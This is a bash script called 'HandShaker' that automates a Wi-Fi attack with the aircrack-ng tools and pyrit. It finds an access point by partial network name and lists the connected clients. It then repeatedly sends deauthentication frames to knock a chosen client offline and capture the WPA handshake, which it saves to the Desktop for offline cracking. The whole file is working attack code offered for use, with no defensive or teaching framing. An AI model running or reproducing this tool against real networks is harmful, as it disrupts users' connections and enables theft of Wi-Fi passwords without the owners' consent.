#!/bin/bash

fapscan()
{
		clear
		gnome-terminal -x airodump-ng mon0 -w "$HOME"/filw --output-format=csv&
		$COLOR 2;echo "[*] Scanning for AP's with names like $ESSID [*]";$COLOR 9
		sleep $SCN
		killall airodump-ng
		DONE=$( cat "$HOME"/filw-01.csv | grep $ESSID ) 
		if [ $DONE -z ] 2> /dev/null
			then
				echo
				rm -rf "$HOME"/filw
				$COLOR 1;echo " [*] Not Found [*]";$COLOR 9
				$COLOR 4;echo " [*] Sleeping $SLP seconds..";$COLOR 9
			else
				csvtool col 4,14 "$HOME"/filw-01.csv > new2.csv
				csvtool col 1,14 "$HOME"/filw-01.csv > new3.csv
				
				if [ $(cat new2.csv | grep $ESSID | cut -c 2) = "," ]
					then
						CHAN=$(cat new2.csv | grep $ESSID | cut -c 1)
					else
						CHAN=$(cat new2.csv | grep $ESSID | cut -c 1-2)
				fi
				BSSID=$(cat new3.csv | grep $ESSID | cut -c 1-17)
				fcap
		fi
		sleep $SLP
		fapscan
}

fcap()
{
	CHKEX="0"
	fclientscan
	$COLOR 2;echo " [*] $CNT active clients found:";$COLOR 9
	cat "$HOME"/jrifskf
	read -p ' [*] Please paste clent MAC: ' CLIE
	FILENAME="$BSSID""--""$RANDOM"
	FILENAME2="$BSSID""-""$RANDOM"".cap"
	gnome-terminal -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w "$HOME"/Desktop/hs/$FILENAME --output-format pcap&
	$COLOR 1;aireplay-ng -0 1 -a $BSSID -c $CLIE mon0;$COLOR 9
	sleep 3
	while [ true ]
		do
			clear
			$COLOR 4;read -p " [*] was the hanshake successfully captured? [Y/n]: " WASCAP;$COLOR 9
			if [ $WASCAP = "n" ] 2> /dev/null
				then
					aireplay-ng -0 1 -a $BSSID -c $CLIE mon0
					sleep 4
				else
					killall airodump-ng
					break
			fi
		done
	echo
	$COLOR 2;echo "[*] Saving and Stripping capture, please wait... [*]";$COLOR 9
	echo
	pyrit -r "$HOME"/Desktop/hs/"$FILENAME"-01.cap -o "$HOME"/Desktop/hs/$FILENAME2 strip
	clear
	rm "$HOME"/Desktop/hs/"$FILENAME"-01.cap
	airmon-ng stop mon0
	rm -rf new.csv
	rm -rf new2.csv
	rm -rf new3.csv
	rm -rf "$HOME"/filw*
	rm -rf "$HOME"/jrifsk*
	clear
	ISDN=$( du -b "$HOME"/Desktop/hs/$FILENAME2)
		
	ISGOOD=$(pyrit -r "$HOME"/Desktop/hs/$FILENAME2 analyze | grep good)
	if [ ${ISGOOD:0:5} = '#' ]
		then
			$COLOR 2;echo " [*] Looks like handshake capture was successfull, Horray for you";$COLOR 9
			$COLOR 4;echo $ISGOOD;$COLOR 9
			echo
			$COLOR 2;echo " [*] Handshake saved to "$HOME"/Desktop/hs/$FILENAME2";$COLOR 9

		else
			$COLOR 1;echo " [*] Sorry, looks like there is a problem with captured handshake";$COLOR 9
			echo
			$COLOR 1;pyrit -r "$HOME"/Desktop/hs/$FILENAME2 analyze;$COLOR 9
			rm -rf "$HOME"/Desktop/hs/$FILENAME2
			echo
	fi
	exit
}

fexit()
{
			airmon-ng stop mon0
			rm -rf new.csv
			rm -rf new2.csv
			rm -rf new3.csv
			rm -rf "$HOME"/filw*
			rm -rf "$HOME"/jrifsk*
			exit
}

fhelp()
{
	clear
	echo """ HandShaker - detect, deauth and capture handshakes by ESSID
	Usage: handshaker x 
			x - Partial unique ESSID (required)

				
	eg. handshaker BTHub3-F
"""
exit
}

fclientscan()
{
	rm -rf "$HOME"/jrif*
	CNT="0"
	clear
	$COLOR 2;echo " [*] AP Found BSSID: $BSSID CHANNEL: $CHAN"
	$COLOR 4;echo ' [*] Please wait while I gather active stations.. [*]';$COLOR 9
	gnome-terminal  -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w "$HOME"/jrifskr&
	if [ $CHKBIT = 0 ] 2> /dev/null
		then
			sleep 7
			CHKBIT=1
		else
			sleep 15
	fi
	killall airodump-ng
	grep 'Station' -A 10 "$HOME"/jrifskr-01.csv > "$HOME"/jrifskp
	while read LINE
		do
			if [ ${LINE:0:4} != "Stat" ]
				then
					echo ${LINE:0:17} >> "$HOME"/jrifskf
			fi
		done < "$HOME"/jrifskp
	clear
	while read LINE
		do
			case ${LINE:2:1} in
			":")CNT=$(( CNT + 1 ));;
			esac
		done < "$HOME"/jrifskf
	if [ $CNT -lt 1 ]
		then
			echo
			$COLOR 1;echo " [*] No Clients found, retrying... [*]";$COLOR 9
			sleep 1
			fclientscan
	fi
}

fstart()
{
CHKBIT=0
COLOR="tput setab"
CHKEX=1
SLP=5
SCN=10
STATSC="0"
MOND=$( ifconfig | grep mon0 | cut -c 1 )
mkdir -p "$HOME"/Desktop/hs

if [ $MOND -z ] 2> /dev/null
	then
		clear
		$COLOR 4;echo " [*] Which interface do you want to use?:";$COLOR 9
		echo
		iwconfig | grep wlan
		echo
		read -p "  >" NIC
		clear
		airmon-ng start $NIC
		clear
	else
		NIC=mon0
		clear
		$COLOR 2;echo " [*] Using mon0 [*]";$COLOR 9
		echo
fi
fapscan
}

trap fexit 2

ESSID="$1"
if [ $# -lt 1 ]
	then
		fhelp
elif [ $1 = "--help" ]
	then
		fhelp
elif [ $1 = "-h" ]
	then
		fhelp
fi

fstart
